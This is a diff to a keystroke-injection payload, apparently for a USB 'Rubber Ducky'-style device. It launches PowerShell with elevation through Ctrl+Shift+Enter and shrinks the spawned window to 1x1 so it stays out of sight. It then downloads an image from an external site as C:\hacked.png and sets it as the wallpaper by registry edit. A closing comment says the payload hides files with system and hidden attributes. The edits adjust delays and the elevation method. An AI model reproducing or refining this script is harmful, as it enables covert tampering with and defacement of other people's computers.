@@ -10,14 +10,14 @@ REM -- Open Powershell --
 
 DELAY 1000
 GUI r
-DELAY 200
+DELAY 350
 STRING powershell
-ENTER
-DELAY 200
+CTRL-SHIFT ENTER
+DELAY 350
 
-REM --Start Powershell As Administrator, Modify Window's Height & Width to 1 & Exit Current Shell--
+REM --Start Powershell With Modified Window's Height & Width to 1 & Exit Current Shell--
 
-STRING  Start-Process Powershell '-noexit -command "[console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth"' -Verb runAs; exit
+STRING  Start-Process Powershell '-noexit -command "[console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth"'; exit
 ENTER
 DELAY 2000
 
@@ -36,10 +36,10 @@ ENTER
 REM --Download Image And Set It As Background--
 
 GUI r
-DELAY 200
+DELAY 350
 STRING powershell
-ENTER
-DELAY 200
+CTRL-SHIFT ENTER
+DELAY 350
 STRING Invoke-WebRequest -Uri https://wallpaperaccess.com/full/896790.png -OutFile C:\hacked.png
 ENTER
 STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.png
@@ -49,4 +49,4 @@ ENTER
 GUI d
 
 
-REM --Reverting Requires "attrib -s -h /s /d *" to be run with powershell from C:\--
+REM --Reverting Requires "attrib -s -h /s /d *" to be run with powershell from C:\User\$currentuser--
